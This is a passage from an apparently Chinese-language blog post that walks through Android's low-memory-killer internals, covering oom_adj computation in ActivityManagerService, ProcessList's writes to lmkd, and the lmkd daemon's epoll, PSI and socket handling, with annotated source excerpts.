ProcessList.SCHED_GROUP_BACKGROUND || procState &gt; ActivityManager.PROCESS_STATE_TOP); i++) { ConnectionRecord cr = clist.get(i); if (cr.binding.client == app) { // Binding to ourself is not interesting. continue; } //当BIND_WAIVE_PRIORITY为1时，客户端就不会影响服务端 //if中的流程就可以略去；否则，客户端就会影响服务端 if ((cr.flags&amp;Context.BIND_WAIVE_PRIORITY) == 0) { ProcessRecord client = cr.binding.client; //计算出客户端进程的oom_adj //由此可看出Android oom_adj的计算多么麻烦 //要是客户端进程中，又有个服务进程被绑定，那么将再计算其客户端进程的oom_adj int clientAdj = computeOomAdjLocked(client, cachedAdj, TOP_APP, doingAll, now); int clientProcState = client.curProcState; if (clientProcState &gt;= ActivityManager.PROCESS_STATE_CACHED_ACTIVITY) { clientProcState = ActivityManager.PROCESS_STATE_CACHED_EMPTY; } String adjType = null; //BIND_ALLOW_OOM_MANAGEMENT置为1时，先按照通常的处理方式，调整服务端进程的adjType if ((cr.flags&amp;Context.BIND_ALLOW_OOM_MANAGEMENT) != 0) { //与前面分析Unbounded Service基本一致，若进程显示过UI或Service超时 //会将clientAdj修改为当前进程的adj，即不需要考虑客户端进程了 if (app.hasShownUi &amp;&amp; app != mHomeProcess) { if (adj &gt; clientAdj) { adjType = &quot;cch-bound-ui-services&quot;; } app.cached = false; clientAdj = adj; clientProcState = procState; } else { if (now &gt;= (s.lastActivity + ActiveServices.MAX_SERVICE_INACTIVITY)) { if (adj &gt; clientAdj) { adjType = &quot;cch-bound-services&quot;; } clientAdj = adj; } } } //根据情况，按照clientAdj调整当前进程的adj if (adj &gt; clientAdj) { if (app.hasShownUi &amp;&amp; app != mHomeProcess &amp;&amp; clientAdj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) { adjType = &quot;cch-bound-ui-services&quot;; } else { //以下的流程表明，client和flag将同时影响Service进程的adj if ((cr.flags&amp;(Context.BIND_ABOVE_CLIENT |Context.BIND_IMPORTANT)) != 0) { //从这里再次可以看出，Service重要性小于等于Client adj = clientAdj &gt;= ProcessList.PERSISTENT_SERVICE_ADJ ? clientAdj : ProcessList.PERSISTENT_SERVICE_ADJ; //BIND_NOT_VISIBLE表示不将服务端当作visible进程看待 //于是，即使客户端的adj小于PERCEPTIBLE_APP_ADJ，service也只能取到PERCEPTIBLE_APP_ADJ } else if ((cr.flags&amp;Context.BIND_NOT_VISIBLE) != 0 &amp;&amp; clientAdj &lt; ProcessList.PERCEPTIBLE_APP_ADJ &amp;&amp; adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) { adj = ProcessList.PERCEPTIBLE_APP_ADJ; } else if (clientAdj &gt;= ProcessList.PERCEPTIBLE_APP_ADJ) { adj = clientAdj; } else { if (adj &gt; ProcessList.VISIBLE_APP_ADJ) { adj = Math.max(clientAdj, ProcessList.VISIBLE_APP_ADJ); } } if ((cr.flags&amp;Context.BIND_NOT_FOREGROUND) == 0) { //进一步更具client调整当前进程的procState、schedGroup等 ... } else { ... } ... if (procState &gt; clientProcState) { procState = clientProcState; } //其它参数的赋值 ... } if ((cr.flags&amp;Context.BIND_TREAT_LIKE_ACTIVITY) != 0) { app.treatLikeActivity = true; } //取出ConnectionRecord所在的Activity final ActivityRecord a = cr.activity; //BIND_ADJUST_WITH_ACTIVITY值为1时，表示服务端可以根据客户端Activity的oom_adj作出相应的调整 if ((cr.flags&amp;Context.BIND_ADJUST_WITH_ACTIVITY) != 0) { if (a != null &amp;&amp; adj &gt; ProcessList.FOREGROUND_APP_ADJ &amp;&amp; (a.visible || a.state == ActivityState.RESUMED || a.state == ActivityState.PAUSING)) { //BIND_ADJUST_WITH_ACTIVITY置为1，且绑定的activity可见或在前台时， //Service进程的oom_adj可以变为FOREGROUND_APP_ADJ adj = ProcessList.FOREGROUND_APP_ADJ; //BIND_NOT_FOREGROUND为0时，才准许调整Service进程的调度优先级 if ((cr.flags&amp;Context.BIND_NOT_FOREGROUND) == 0) { if ((cr.flags&amp;Context.BIND_IMPORTANT) != 0) { schedGroup = ProcessList.SCHED_GROUP_TOP_APP; } else { schedGroup = ProcessList.SCHED_GROUP_DEFAULT; } } //改变其它参数 app.cached = false; app.adjType = &quot;service&quot;; app.adjTypeCode = ActivityManager.RunningAppProcessInfo .REASON_SERVICE_IN_USE; app.adjSource = a; app.adjSourceProcState = procState; app.adjTarget = s.name; } } }}... 以上就是计算含有 Service 进程的 oom_adj 的全部过程。从代码上看进程仅含有 Unbounded Service 时，整个计算过程比较简单，只要进程没有显示 UI 且 Service 的存在没有超时时，进程的 oom_adj 就被调整为 SERVICE_ADJ。当进程含有 Bounded Service 时，整个计算的复杂度就大大提高，它将考虑到 Bound 使用 flag 以及客户端的情况，综合调整进程的 oom_adj。 4.6 这部分代码主要是用来处理含有 ContentProvider 的进程。由于 ContentProvider 也有客户端，因此同样需要根据客户端进程调整到当前进程的 oom_adj。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576...//依次处理进程中的ContentProviderfor (int provi = app.pubProviders.size()-1; provi &gt;= 0 &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ || schedGroup == ProcessList.SCHED_GROUP_BACKGROUND || procState &gt; ActivityManager.PROCESS_STATE_TOP); provi--) { ContentProviderRecord cpr = app.pubProviders.valueAt(provi); //依次处理ContentProvider的客户端 for (int i = cpr.connections.size()-1; i &gt;= 0 &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ || schedGroup == ProcessList.SCHED_GROUP_BACKGROUND || procState &gt; ActivityManager.PROCESS_STATE_TOP); i--) { ContentProviderConnection conn = cpr.connections.get(i); ProcessRecord client = conn.client; if (client == app) { // Being our own client is not interesting. continue; } //计算客户端的oom_adj int clientAdj = computeOomAdjLocked(client, cachedAdj, TOP_APP, doingAll, now); int clientProcState = client.curProcState; if (clientProcState &gt;= ActivityManager.PROCESS_STATE_CACHED_ACTIVITY) { clientProcState = ActivityManager.PROCESS_STATE_CACHED_EMPTY; } //与Unbounded Service的处理基本类似 if (adj &gt; clientAdj) { if (app.hasShownUi &amp;&amp; app != mHomeProcess &amp;&amp; clientAdj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) { app.adjType = &quot;cch-ui-provider&quot;; } else { //根据clientAdj，调整当前进程的adj adj = clientAdj &gt; ProcessList.FOREGROUND_APP_ADJ ? clientAdj : ProcessList.FOREGROUND_APP_ADJ; app.adjType = &quot;provider&quot;; } //调整其它变量 app.cached &amp;= client.cached; app.adjTypeCode = ActivityManager.RunningAppProcessInfo .REASON_PROVIDER_IN_USE; app.adjSource = client; app.adjSourceProcState = clientProcState; app.adjTarget = cpr.name; } //进一步调整调度策略和procState ... //特殊情况的处理 if (cpr.hasExternalProcessHandles()) { if (adj &gt; ProcessList.FOREGROUND_APP_ADJ) { adj = ProcessList.FOREGROUND_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_DEFAULT; app.cached = false; app.adjType = &quot;provider&quot;; app.adjTarget = cpr.name; } if (procState &gt; ActivityManager.PROCESS_STATE_IMPORTANT_FOREGROUND) { procState = ActivityManager.PROCESS_STATE_IMPORTANT_FOREGROUND; } } }}//如果进程之前运行过ContentProvider，同时ContentProvider的存活时间没有超时//那么进程的adj可以变为PREVIOUS_APP_ADJif (app.lastProviderTime &gt; 0 &amp;&amp; (app.lastProviderTime+CONTENT_PROVIDER_RETAIN_TIME) &gt; now) { if (adj &gt; ProcessList.PREVIOUS_APP_ADJ) { adj = ProcessList.PREVIOUS_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_BACKGROUND; app.cached = false; app.adjType = &quot;provider&quot;; } if (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) { procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY; }}... 从代码上看，处理含有 ContentProvider 进程时，相对比较简单。基本上与处理含有 Unbounded Service 的进程一致，只是最后增加了一些特殊情况的处理。 4.7 这部分代码主要是针对 Service 进程作一些处理，同时判断的依据与前一次记录的 Service 进程总数有关。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//根据进程信息，进一步调整procState...//对Service进程做一些特殊处理if (adj == ProcessList.SERVICE_ADJ) { if (doingAll) { //每次updateOomAdj时，将mNewNumAServiceProcs置为0 //然后LRU list中，从后往前数，前1/3的service进程就是AService //其余的就是bService //mNumServiceProcs为上一次update时，service进程的数量 app.serviceb = mNewNumAServiceProcs &gt; (mNumServiceProcs/3); //记录这一次update后，service进程的数量 //update完毕后，该值将赋给mNumServiceProcs mNewNumServiceProcs++; ... if (!app.serviceb) { // 如果不是bService，但内存回收等级过高，也被视为bService if (mLastMemoryLevel &gt; ProcessStats.ADJ_MEM_FACTOR_NORMAL &amp;&amp; app.lastPss &gt;= mProcessList.getCachedRestoreThresholdKb()) { app.serviceHighRam = true; app.serviceb = true; ... } else { //LRU中后1/3的Service，都是AService mNewNumAServiceProcs++; ... } } else { app.serviceHighRam = false; } } //将bService的oom_adj调整为SERVICE_B_ADJ if (app.serviceb) { adj = ProcessList.SERVICE_B_ADJ; }}//计算完毕app.curRawAdj = adj;...//if基本没有用，maxAdj已经是最大的UNKNOW_ADJif (adj &gt; app.maxAdj) { adj = app.maxAdj; if (app.maxAdj &lt;= ProcessList.PERCEPTIBLE_APP_ADJ) { schedGroup = ProcessList.SCHED_GROUP_DEFAULT; }}//最后做一些记录和调整...return app.curRawAdj; # （二）ProcessList.java # 1. updataOomLevels 方法 updateOomLevels 方法只是简单的计算出 oomMinFree 数组的值和 oomAdj 值，然后通过 writeLmkd 将数据发送给 lmkd。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556private void updateOomLevels(int displayWidth, int displayHeight, boolean write) { // 计算memory的scale数值 float scaleMem = ((float)(mTotalMemMb-350))/(700-350); // 计算显示屏的scale值 int minSize = 480*800; // 384000 int maxSize = 1280*800; // 1024000 230400 870400 .264 float scaleDisp = ((float)(displayWidth*displayHeight)-minSize)/(maxSize-minSize); if (false) { Slog.i(&quot;XXXXXX&quot;, &quot;scaleMem=&quot; + scaleMem); Slog.i(&quot;XXXXXX&quot;, &quot;scaleDisp=&quot; + scaleDisp + &quot; dw=&quot; + displayWidth + &quot; dh=&quot; + displayHeight); } //比较memory和显示屏scale值的大小，取较大值 float scale = scaleMem &gt; scaleDisp ? scaleMem : scaleDisp; if (scale &lt; 0) scale = 0; else if (scale &gt; 1) scale = 1; int minfree_adj = Resources.getSystem().getInteger( com.android.internal.R.integer.config_lowMemoryKillerMinFreeKbytesAdjust); int minfree_abs = Resources.getSystem().getInteger( com.android.internal.R.integer.config_lowMemoryKillerMinFreeKbytesAbsolute); if (false) { Slog.i(&quot;XXXXXX&quot;, &quot;minfree_adj=&quot; + minfree_adj + &quot; minfree_abs=&quot; + minfree_abs); } //判断是否为64位系统 final boolean is64bit = Build.SUPPORTED_64_BIT_ABIS.length &gt; 0; //根据mOomMinFreeLow、mOomMinFreeHigh和scale值填充mOomMinFree数组 for (int i=0; i&lt;mOomAdj.length; i++) { int low = mOomMinFreeLow[i]; int high = mOomMinFreeHigh[i]; //如果是64位系统，第四和第五级的数值会稍大一点 if (is64bit) { if (i == 4) high = (high*3)/2; else if (i == 5) high = (high*7)/4; } mOomMinFree[i] = (int)(low + ((high-low)*scale)); } ... mCachedRestoreLevel = (getMemLevel(ProcessList.CACHED_APP_MAX_ADJ)/1024) / 3; int reserve = displayWidth * displayHeight * 4 * 3 / 1024; int reserve_adj = Resources.getSystem().getInteger(com.android.internal.R.integer.config_extraFreeKbytesAdjust); int reserve_abs = Resources.getSystem().getInteger(com.android.internal.R.integer.config_extraFreeKbytesAbsolute); ... //如果需要写入则调用writelmkd将buf写入到lowmemoryKiller中 if (write) { ByteBuffer buf = ByteBuffer.allocate(4 * (2*mOomAdj.length + 1)); buf.putInt(LMK_TARGET); for (int i=0; i&lt;mOomAdj.length; i++) { buf.putInt((mOomMinFree[i]*1024)/PAGE_SIZE); buf.putInt(mOomAdj[i]); } writeLmkd(buf); SystemProperties.set(&quot;sys.sysctl.extra_free_kbytes&quot;, Integer.toString(reserve)); } // GB: 2048,3072,4096,6144,7168,8192 // HC: 8192,10240,12288,14336,16384,20480 } # 2. writeLmkd 方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344private static void writeLmkd(ByteBuffer buf) { //尝试打开lmkd socket端口 for (int i = 0; i &lt; 3; i++) { if (sLmkdSocket == null) { if (openLmkdSocket() == false) { try { Thread.sleep(1000); } catch (InterruptedException ie) { } continue; } } try { //将数据写到socket端口中 sLmkdOutputStream.write(buf.array(), 0, buf.position()); return; } catch (IOException ex) { Slog.w(TAG, &quot;Error writing to lowmemorykiller socket&quot;); try { sLmkdSocket.close(); } catch (IOException ex2) { } sLmkdSocket = null; } } }}private static boolean openLmkdSocket() { try { //创建本地socket句柄，尝试连接socket sLmkdSocket = new LocalSocket(LocalSocket.SOCKET_SEQPACKET); //连接本地名为lmkd的本地socket sLmkdSocket.connect( new LocalSocketAddress(&quot;lmkd&quot;, LocalSocketAddress.Namespace.RESERVED)); //获取lmkd socket的输出流，用于向对端写入数据 sLmkdOutputStream = sLmkdSocket.getOutputStream(); } catch (IOException ex) { Slog.w(TAG, &quot;lowmemorykiller daemon socket open failed&quot;); sLmkdSocket = null; return false; } return true; } # （三）lmkd.c（/system/core/lmkd/lmkd.c） lmk 与大多数守护进程一样，由 init 进程启动： 1234567891011service lmkd /system/bin/lmkd class core user lmkd group lmkd system readproc capabilities DAC_OVERRIDE KILL IPC_LOCK SYS_NICE SYS_RESOURCE critical socket lmkd seqpacket+passcred 0660 system system writepid /dev/cpuset/system-background/taskson property:lmkd.reinit=1 exec_background /system/bin/lmkd --reinit 这里创建的 socket lmkd 的 user/group 都是 system，而它的权限是 0660，所以只有 system 应用才能读写（一般是 activity manager）。 # 1. main 函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546int main(int argc __unused, char **argv __unused) { struct sched_param param = { //添加调度策略，即先进先出 .sched_priority = 1, }; mlockall(MCL_FUTURE); //给虚拟空间上锁，防止内存交换 sched_setscheduler(0, SCHED_FIFO, &amp;param); if (!init()) //init 处理所有核心的初始化工作 mainloop(); ALOGI(&quot;exiting&quot;); return 0;}//新版供对比int main(int argc, char **argv) { ... update_props(); //step 1，进程最初，需要获取所有的lmkd 的prop，为init 做准备 ctx = create_android_logger(KILLINFO_LOG_TAG); if (!init()) { //step 2，init 处理所有核心的初始化工作 if (!use_inkernel_interface) { //step 3，如果不再使用旧的LMK 驱动程序 ... //step4, 给虚拟空间上锁，防止内存交换 if (mlockall(MCL_CURRENT | MCL_FUTURE | MCL_ONFAULT) &amp;&amp; (errno != EINVAL)) { ALOGW(&quot;mlockall failed %s&quot;, strerror(errno)); } //step 4，添加调度策略，即先进先出 struct sched_param param = { .sched_priority = 1, }; if (sched_setscheduler(0, SCHED_FIFO, &amp;param)) { ALOGW(&quot;set SCHED_FIFO failed %s&quot;, strerror(errno)); } } mainloop(); //step 5， 进入循环，等待polling } android_log_destroy(&amp;ctx); ALOGI(&quot;exiting&quot;); return 0;} 在 shed_setscheduler () 中，设置此线程的调度策略为 SCHED_FIFO，即为先进先出；通过 SHED_FIFO 这种实时调度策略，优先级从 1 (low)-&gt;99（high）。param 中主要设置 sched_priority，实时线程通常比普通线程有更高的优先级。然后就调用 init 进行初始化，进入 mainloop () 中循环监听 socket。 在新版代码中可以看到 lmkd 的核心部分在 step2（init）和 step5（mainloop），之后将单独说明 这里需注意到 mlockall 函数，在新的 LMK 驱动程序中 123if (mlockall(MCL_CURRENT | MCL_FUTURE | MCL_ONFAULT) &amp;&amp; (errno != EINVAL)) { ALOGW(&quot;mlockall failed %s&quot;, strerror(errno));} mlockall 函数将调用进程的全部虚拟地址空间加锁。防止出现内存交换，将该进程的地址空间交换到外存上。 mlockall 将所有映射到进程地址空间的内存上锁。这些页包括： 代码段，数据段，栈段，共享库，共享内存，user space kernel data,memory-mapped file. 当函数成功返回的时候，所有的被映射的页都在内存中。 flags 可取两个值：MCL_CURRENT,MCL_FUTURE MCL_CURRENT: 表示对所有已经映射到进程地址空间的页上锁 MCL_FUTURE: 表示对所有将来映射到进程地空间的页都上锁。 函数返回： 成功返回 0，出错返回 - 1 此函数有两个重要的应用： real-time algorithms (实时算法) 和 high-security data processing (机密数据的处理) real-time algorithms：对时间要非常高。 如果进程执行了一个 execve 类函数，所有的锁都会被删除。 内存锁不会被子进程继承。 内存锁不会叠加，即使多次调用 mlockall 函数，只调用一次 munlock 就会解锁 # 2. init 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859static int init(void) { //epoll事件 struct epoll_event epev; int i; int ret; page_k = sysconf(_SC_PAGESIZE); if (page_k == -1) page_k = PAGE_SIZE; page_k /= 1024; //创建epoll文件句柄 epollfd = epoll_create(MAX_EPOLL_EVENTS); if (epollfd == -1) { ALOGE(&quot;epoll_create failed (errno=%d)&quot;, errno); return -1; } //获取lmkd socket的控制权 ctrl_lfd = android_get_control_socket(&quot;lmkd&quot;); if (ctrl_lfd &lt; 0) { ALOGE(&quot;get lmkd control socket failed&quot;); return -1; } //监听lmkd socket ret = listen(ctrl_lfd, 1); if (ret &lt; 0) { ALOGE(&quot;lmkd control socket listen failed (errno=%d)&quot;, errno); return -1; } //设置epoll事件的触发方式epev.events = EPOLLIN;//设置epoll事件的处理函数epev.data.ptr = (void *)ctrl_connect_handler;//在epollfd中添加对lmkd socket文件句柄的监听 if (epoll_ctl(epollfd, EPOLL_CTL_ADD, ctrl_lfd, &amp;epev) == -1) { ALOGE(&quot;epoll_ctl for lmkd control socket failed (errno=%d)&quot;, errno); return -1; }maxevents++;//判断INKERNEL_MINFREE_PATH是否有写权限，INKERNEL_MINFREE_PATH定义如下：//#define INKERNEL_MINFRE_PATH //“/sys/module/lowmemorykiller/parameters/minfree”use_inkernel_interface = !access(INKERNEL_MINFREE_PATH, W_OK); if (use_inkernel_interface) { ALOGI(&quot;Using in-kernel low memory killer interface&quot;); } else { ret = init_mp(MEMPRESSURE_WATCH_LEVEL, (void *)&amp;mp_event); if (ret) ALOGE(&quot;Kernel does not support memory pressure events or in-kernel low memory killer&quot;); } for (i = 0; i &lt;= ADJTOSLOT(OOM_SCORE_ADJ_MAX); i++) { procadjslot_list[i].next = &amp;procadjslot_list[i]; procadjslot_list[i].prev = &amp;procadjslot_list[i]; } return 0; } # 2.1 创建 epoll 12345epollfd = epoll_create(MAX_EPOLL_EVENTS); if (epollfd == -1) { ALOGE(&quot;epoll_create failed (errno=%d)&quot;, errno); return -1; } 整个 lmkd 都是依赖 epoll 机制，这里创建了 9 个 event： 12345/* * 1 ctrl listen socket, 3 ctrl data socket, 3 memory pressure levels, * 1 lmk events + 1 fd to wait for process death */#define MAX_EPOLL_EVENTS (1 + MAX_DATA_CONN + VMPRESS_LEVEL_COUNT + 1 + 1) # 2.2 初始化 socket lmkd 1234567891011121314151617181920ctrl_sock.sock = android_get_control_socket(&quot;lmkd&quot;);if (ctrl_sock.sock &lt; 0) { ALOGE(&quot;get lmkd control socket failed&quot;); return -1;}ret = listen(ctrl_sock.sock, MAX_DATA_CONN);if (ret &lt; 0) { ALOGE(&quot;lmkd control socket listen failed (errno=%d)&quot;, errno); return -1;}epev.events = EPOLLIN;ctrl_sock.handler_info.handler = ctrl_connect_handler;epev.data.ptr = (void *)&amp;(ctrl_sock.handler_info);if (epoll_ctl(epollfd, EPOLL_CTL_ADD, ctrl_sock.sock, &amp;epev) == -1) { ALOGE(&quot;epoll_ctl for lmkd control socket failed (errno=%d)&quot;, errno); return -1;}maxevents++; ctrl_sock 主要存储的是 socket lmkd 的 fd 和 handle info，主要注意这里的 ctrl_connect_handler () 该函数时 socket /dev/socket/lmkd 有信息时的处理函数，lmkd 的客户端 AMS.mProcessList 会通过 socket /dev/socket/lmkd 与 lmkd 进行通信。 # 2.3 确定是否使用 LMK 驱动程序 1234#define INKERNEL_MINFREE_PATH &quot;/sys/module/lowmemorykiller/parameters/minfree&quot; has_inkernel_module = !access(INKERNEL_MINFREE_PATH, W_OK); use_inkernel_interface = has_inkernel_module; 通过 access 函数确认旧的节点是否还存在，用于确认 kernel 是否还在使用 LMK 程序（kernel 4.12 已废弃） # 2.4 init_monitors 该函数是 init 函数中的核心了，这里用来注册 PSI 的监视器策略（Android11 及以后）或者是 common 的 adj 策略 (vmpressure，Android11 之前)，并将其添加到 epoll 中。 12345678910111213141516171819static bool init_monitors() { /* Try to use psi monitor first if kernel has it */ use_psi_monitors = property_get_bool(&quot;ro.lmk.use_psi&quot;, true) &amp;&amp; init_psi_monitors(); /* Fall back to vmpressure */ if (!use_psi_monitors &amp;&amp; (!init_mp_common(VMPRESS_LEVEL_LOW) || !init_mp_common(VMPRESS_LEVEL_MEDIUM) || !init_mp_common(VMPRESS_LEVEL_CRITICAL))) { ALOGE(&quot;Kernel does not support memory pressure events or in-kernel low memory killer&quot;); return false; } if (use_psi_monitors) { ALOGI(&quot;Using psi monitors for memory pressure detection&quot;); } else { ALOGI(&quot;Using vmpressure for memory pressure detection&quot;); } return true;} 1234567891011121314151617181920212223242526272829303132333435363738394041- 如果使用vmpressure，则通过init_mp_common 来初始化kill 策略；- 如果使用PSI，则通过init_psi_monitors 来初始化kill 策略；所以lmkd 中如果使用 PSI ，要求 ro.lmk.use_psi 为 true(注：博主说的其实有点问题，property_get_bool函数中的参数true为默认值，该值不设置即默认返回为true，并不需要设置为true)。另外，lmkd 支持旧模式的kill 策略，只要 ro.lmk.use_new_strategy 设为false，或者将ro.lmk.use_minfree_levels 设为true（针对非低内存设备，即ro.config.low_ram 不为true）。继续深入分析init_psi_monitors()函数。```cstatic bool init_psi_monitors() { /* * When PSI is used on low-ram devices or on high-end devices without memfree levels * use new kill strategy based on zone watermarks, free swap and thrashing stats */ bool use_new_strategy = property_get_bool(&quot;ro.lmk.use_new_strategy&quot;, low_ram_device || !use_minfree_levels); /* In default PSI mode override stall amounts using system properties */ if (use_new_strategy) { /* Do not use low pressure level */ psi_thresholds[VMPRESS_LEVEL_LOW].threshold_ms = 0; psi_thresholds[VMPRESS_LEVEL_MEDIUM].threshold_ms = psi_partial_stall_ms; psi_thresholds[VMPRESS_LEVEL_CRITICAL].threshold_ms = psi_complete_stall_ms; } // mp应该时memory pressure的意思 if (!init_mp_psi(VMPRESS_LEVEL_LOW, use_new_strategy)) { return false; } if (!init_mp_psi(VMPRESS_LEVEL_MEDIUM, use_new_strategy)) { destroy_mp_psi(VMPRESS_LEVEL_LOW); return false; } if (!init_mp_psi(VMPRESS_LEVEL_CRITICAL, use_new_strategy)) { destroy_mp_psi(VMPRESS_LEVEL_MEDIUM); destroy_mp_psi(VMPRESS_LEVEL_LOW); return false; } return true;} 函数比较简单的，最开始的变量 use_new_strategy 用以确认是使用 PSI 策略还是 vmpressure。如果是使用 PSI 策略， psi_thresholds 数组中的 threshold_ms 需要重新赋值为 prop 指定的值（也就是说支持动态配置）。最后通过 init_mp_psi 为每个级别的 strategy 进行最后的注册，当然对于 PSI，只有 some 和 full 等级，所以与 level 中的 medium 和 critical 分别对应。 这里的 psi_thresholds 数组中 threshold_ms 通过 prop： ro.lmk.psi_partial_stall_ms low_ram 默认为 200ms，PSI 默认为 70ms； ro.lmk.psi_complete_stall_ms 默认 700ms； 对于 init_mp_psi 123456789101112131415161718192021222324252627static bool init_mp_psi(enum vmpressure_level level, bool use_new_strategy) { int fd; /* Do not register a handler if threshold_ms is not set */ if (!psi_thresholds[level].threshold_ms) { return true; } // 注意这里 fd = init_psi_monitor(psi_thresholds[level].stall_type, psi_thresholds[level].threshold_ms * US_PER_MS, PSI_WINDOW_SIZE_MS * US_PER_MS); if (fd &lt; 0) { return false; } vmpressure_hinfo[level].handler = use_new_strategy ? mp_event_psi : mp_event_common; vmpressure_hinfo[level].data = level; if (register_psi_monitor(epollfd, fd, &amp;vmpressure_hinfo[level]) &lt; 0) { destroy_psi_monitor(fd); return false; } maxevents++; mpevfd[level] = fd; return true;} 通过 init_psi_monitor 将不同 level 的值写入节点 /proc/pressure/memory，后期阈值如果超过了设定就会触发一次 epoll； 根据 use_new_strategy，选择是新策略 mp_event_psi，还是旧模式 mp_event_common，详细的策略见第 8 节和第 10 节； 通过 register_psi_monitor 将节点 /proc/pressure/memory 添加到 epoll 中监听； 123456static void mp_event_psi(int data, uint32_t events, struct polling_params *poll_params) { enum reclaim_state { NO_RECLAIM = 0, KSWAPD_RECLAIM, DIRECT_RECLAIM, }; # 2.5 标记进入 lmkd 流程 12/* let the others know it does support reporting kills */property_set(&quot;sys.lmk.reportkills&quot;, &quot;1&quot;); # 2.6 其他初始化 123456789101112131415161718memset(killcnt_idx, KILLCNT_INVALID_IDX, sizeof(killcnt_idx)); /* * Read zoneinfo as the biggest file we read to create and size the initial * read buffer and avoid memory re-allocations during memory pressure */ if (reread_file(&amp;file_data) == NULL) { ALOGE(&quot;Failed to read %s: %s&quot;, file_data.filename, strerror(errno)); } /* check if kernel supports pidfd_open syscall */ pidfd = TEMP_FAILURE_RETRY(pidfd_open(getpid(), 0)); if (pidfd &lt; 0) { pidfd_supported = (errno != ENOSYS); } else { pidfd_supported = true; close(pidfd); } 这里主要是 reread_file 函数，用来占坑。通过读取 /proc/zoneinfo ，创建一个最大 size 的 buffer，后面的其他节点都直接使用该 buffer，而不用再重新 malloc。详细看 reread_file() 中的 buf 变量。 另外，通过 sys_pidfd_open ，确定是否支持 pidfd_open 的 syscall。 至此，init 基本剖析完成，主要： 创建 epoll，用以监听 9 个 event； 初始化 socket /dev/socket/lmkd ，并将其添加到 epoll 中； 根据 prop ro.lmk.use_psi 确认是否使用 PSI 还是 vmpressure； 根据 prop ro.lmk.use_new_strategy 或者通过 prop ro.lmk.use_minfree_levels 和 prop ro.config.low_ram 使用 PSI 时的新策略还是旧策略； 新、旧策略主要体现在 mp_event_psi 和 mp_event_common 处理，而本质都是通过节点 /proc/pressure/memory 获取内存压力是否达到 some/full 指定来确认是否触发 event； 后期 epoll 触发主要的处理函数是 mp_event_psi 或 mp_event_common ； # 3. mainloop 12345678910111213141516171819202122232425static void mainloop(void) { //一直循环等待 while (1) { struct epoll_event events[maxevents]; int nevents; int i; ctrl_dfd_reopened = 0; //在init方法中，我们已经经lmkd socket的listen事件添加到epollfd中 //并等待epollfd事件除法 nevents = epoll_wait(epollfd, events, maxevents, -1); if (nevents == -1) { if (errno == EINTR) continue; ALOGE(&quot;epoll_wait failed (errno=%d)&quot;, errno); continue; } //处理listen事件到来 for (i = 0; i &lt; nevents; ++i) { if (events[i].events &amp; EPOLLERR) ALOGD(&quot;EPOLLERR on event #%d&quot;, i); if (events[i].data.ptr) (*(void (*)(uint32_t))events[i].data.ptr)(events[i].events); } }} 在 mainloop 方法中，epoll_wait 在等到 lmkd socket 的 listen 事件到来，然后再调用 event.data.ptr 方法。在 Init 方法中，我们将 event.data.ptr 指向 ctrl_connect_handler 方法。 # 4.ctrl_connect_handler 方法 1234567891011121314151617181920212223242526272829static void ctrl_connect_handler(uint32_t events __unused) { //这里创建了另一个epoll事件 struct sockaddr addr; socklen_t alen; struct epoll_event epev; if (ctrl_dfd &gt;= 0) { ctrl_data_close(); ctrl_dfd_reopened = 1;}//接受lmkd socket的连接请求 alen = sizeof(addr); ctrl_dfd = accept(ctrl_lfd, &amp;addr, &amp;alen); if (ctrl_dfd &lt; 0) { ALOGE(&quot;lmkd control socket accept failed; errno=%d&quot;, errno); return; } ALOGI(&quot;ActivityManager connected&quot;);maxevents++;//设置empoll监听事件epev.events = EPOLLIN;//设置epoll处理函数epev.data.ptr = (void *)ctrl_data_handler;//将accept后的socket套接字添加到epollfd中进行监听 if (epoll_ctl(epollfd, EPOLL_CTL_ADD, ctrl_dfd, &amp;epev) == -1) { ALOGE(&quot;epoll_ctl for data connection socket failed; errno=%d&quot;, errno); ctrl_data_close(); return; }} ctrl_connect_handler 方法在处理 lmkd socket 的 listen 事件时，会像 epoll 创建另一个 epoll 事件一样，用于处理 lmkd socket 的 accept 事件，accetpt 事件的处理方法为 ctrl_data_handler 。 # 5. ctrl_data_handler 方法 12345678910static void ctrl_data_handler(uint32_t events) { if (events &amp; EPOLLHUP) { ALOGI(&quot;ActivityManager disconnected&quot;); if (!ctrl_dfd_reopened) ctrl_data_close();} else if (events &amp; EPOLLIN) { //处理epoll事件，即文件句柄的读事件 ctrl_command_handler(); }} 当时添加到 epoll 时是以 EPOLLIN 添加的，所以这里接着会调用 ctrl_command_handler # 6. ctrl_command_handler 方法 12345678910111213141516171819202122232425262728293031323334353637383940414243static void ctrl_command_handler(void) { //读取数据buffer int ibuf[CTRL_PACKET_MAX / sizeof(int)]; int len; int cmd = -1; int nargs; int targets; //读取数据到ibuf中 len = ctrl_data_read((char *)ibuf, CTRL_PACKET_MAX); if (len &lt;= 0) return; //获取数据长度 nargs = len / sizeof(int) - 1; if (nargs &lt; 0) goto wronglen; //解析处数据中的comand字段 cmd = ntohl(ibuf[0]);//根据不同长度的command字段，调用不同的数据处理方法 switch(cmd) { case LMK_TARGET: targets = nargs / 2; if (nargs &amp; 0x1 || targets &gt; (int)ARRAY_SIZE(lowmem_adj)) goto wronglen; cmd_target(targets, &amp;ibuf[1]); break; case LMK_PROCPRIO: if (nargs != 3) goto wronglen; cmd_procprio(ntohl(ibuf[1]), ntohl(ibuf[2]), ntohl(ibuf[3])); break; case LMK_PROCREMOVE: if (nargs != 1) goto wronglen; cmd_procremove(ntohl(ibuf[1])); break; default: ALOGE(&quot;Received unknown command code %d&quot;, cmd); return; } return;wronglen: ALOGE(&quot;Wrong control socket read length cmd=%d len=%d&quot;, cmd, len);} 主要处理从 ProcessList.java 中发出的几个 lmk command： 123456enum lmk_cmd { 